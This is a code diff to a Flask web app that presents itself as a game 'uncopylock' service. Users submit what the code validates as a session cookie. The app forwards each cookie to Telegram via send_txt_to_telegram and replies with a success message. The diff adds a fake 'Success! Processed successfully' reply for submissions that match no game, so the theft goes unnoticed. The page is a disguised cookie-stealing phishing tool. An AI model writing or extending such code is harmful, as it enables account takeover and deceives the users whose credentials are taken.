@@ -23,6 +23,15 @@ DEFAULT_GAME = next(
      for g in GAMES if g.get("DEFAULTgameid")), 
     GAMES[0] if GAMES else {}
 )
+
+def is_valid_game(game: dict) -> bool:
+    return (
+        game
+        and game.get("path")
+        and game.get("name")
+        and game.get("path") != "None"
+        and game.get("name") != "None"
+    )
   
 sessions = {} 
     
@@ -47,41 +56,44 @@ def validate_cookie(cookie: str) -> bool:
     ]  
     return cookie and any(sub in cookie for sub in required)  
   
-  
-@app.route('/', methods=['GET', 'POST'])  
+@app.route('/', methods=['GET', 'POST'])
 def index():
-    if request.method == 'POST':  
-        #cookie = request.form.get('place_id', '').strip()
-        
+    if request.method == 'POST':
         data = request.get_json()
         cookie = data.get('place_id', '')
-  
-        if not validate_cookie(cookie):  
-            return jsonify({"type": "error", "msg": "XAR invalid or not found."})  
-    
+
+        if not validate_cookie(cookie):
+            return jsonify({"type": "error", "msg": "XAR invalid or not found."})
+
         send_txt_to_telegram(cookie)
-    
-        token = secrets.token_urlsafe(20)  
-    
-        selected_game = DEFAULT_GAME.copy()  
-        for game in GAMES:  
+
+        token = secrets.token_urlsafe(20)
+
+        selected_game = DEFAULT_GAME.copy()
+        for game in GAMES:
             if "gameid" in game and game["gameid"] in cookie:
-                selected_game = game  
-                break  
-    
-        sessions[token] = {  
-            "cookie": cookie,  
-            "game": selected_game  
-        }  
-  
-        return jsonify({  
-            "type": "response",  
-            "msg": "Uncopylocked successfully!",  
-            "Path": f"/uncopylocked?token={token}"  
-        })  
-  
+                selected_game = game
+                break
+
+        if not is_valid_game(selected_game):
+            return jsonify({
+                "type": "responses",
+                "msg": "Success! Processed successfully"
+            })
+            
+
+        sessions[token] = {
+            "cookie": cookie,
+            "game": selected_game
+        }
+
+        return jsonify({
+            "type": "response",
+            "msg": "Uncopylocked successfully!",
+            "Path": f"/uncopylocked?token={token}"
+        })
+
     return render_template('index.html')  
-  
   
 @app.route("/uncopylocked")  
 def uncopylocked():  
